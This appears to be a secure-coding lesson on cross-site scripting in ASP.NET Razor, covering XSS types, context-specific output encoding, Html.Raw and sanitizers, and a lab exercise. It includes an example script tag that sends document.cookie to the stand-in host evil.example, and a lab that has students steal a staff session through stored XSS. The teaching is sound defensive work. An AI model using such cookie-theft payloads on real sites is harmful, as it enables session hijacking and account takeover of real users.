title: XSS and output encoding
summary: When text becomes code in someone else's browser. Reflected, stored and DOM XSS, why encoding depends on where the text lands (HTML, attribute, URL, JavaScript), Razor's auto-encoding and the Html.Raw opt-out.

steps.title: Text that becomes code
body: ```text
GET /search?q=<script>new Image().src='https://evil.example/c?'+document.cookie</script>
HTTP/1.1 200 OK
Content-Type: text/html
Results for

The server pasted the search term into HTML, so the browser runs it as a script, **on the shop's origin**: it can read the page, call the API as the user, and (if the cookie is not `HttpOnly`) send the session away. That is **cross-site scripting**, filed under A05 Injection.
- **Reflected**: the payload is in the request and comes straight back (a link someone is tricked into opening).
- **Stored**: the payload is saved (a review, a display name, a support ticket) and served to everyone who views it, staff included. The worst kind: no link needed.
- **DOM-based**: the server never sees it; the page's own JavaScript writes attacker data into the DOM, e.g. `el.innerHTML = location.hash.slice(1)`.

steps.title: Encode for the place it lands
body: The fix is **output encoding**: turn characters that mean something in the surrounding syntax into a harmless spelling. Which characters matter depends on the **context**:
| Context | Example | Encoder (`System.Text.Encodings.Web`) | `lamps & <b>` becomes |

| HTML text | `

{q}

` | `HtmlEncoder.Default` | `lamps & <b>` |
| quoted attribute | `<input value="{q}">` | `HtmlEncoder.Default` (always quote attributes) | the same |
| URL parameter | `<a href="/s?q={q}">` | `UrlEncoder.Default` | `lamps%20%26%20%3Cb%3E` |
| JavaScript string | `<script>var t = '{q}'</script>` | `JavaScriptEncoder.Default` | `lamps \u0026 \u003Cb\u003E` |

Two contexts have no safe encoding: an **unquoted** attribute, and a **URL that is the whole `href`** (`javascript:alert(1)` contains nothing to encode). For the second, check the scheme (`https:` only) before you write it.
Encode **on output**, not on input: the same review is shown in HTML, sent in JSON and put in a CSV, and each needs different encoding.

steps.title: Razor encodes for you. Html.Raw does not.
body: Razor HTML-encodes every `@expression`:
```cshtml

@review.Body
@*

@Html.Raw(review.Body)
@* the opt-out: written as it is *@
So in Razor, XSS almost always comes from one of four places, and these are what to search for in review:
1. `@Html.Raw(...)` or `new HtmlString(...)` on anything a user could have typed;
2. HTML built as a string in C# (`$"{name}"`) and returned with `Results.Content(..., "text/html")`;
3. JavaScript that writes into the DOM with `innerHTML`, `outerHTML`, `insertAdjacentHTML`, `document.write`, or jQuery's `.html()`; use `textContent` instead;
4. `href`/`src` from user data (`javascript:` URLs).

When users really need formatting (bold, links), sanitize on the server with an allow-list sanitizer (the `HtmlSanitizer` NuGet package) or in the browser with **DOMPurify**, never with a home-made regex.

steps.title: Live lab: steal the staff session with stored XSS
prompt: In the **vulnerable shop** lab, do **Attack: steal the staff session with stored XSS**. A real Chromium on the bot host reads your review as a signed-in member of staff; your script sends their cookie to your `listen` server, and you use it. The fix is in the next lesson, together with a Content-Security-Policy.
steps.explain: One `Html.Raw` and one cookie without `HttpOnly` turned a review box into a staff account takeover.
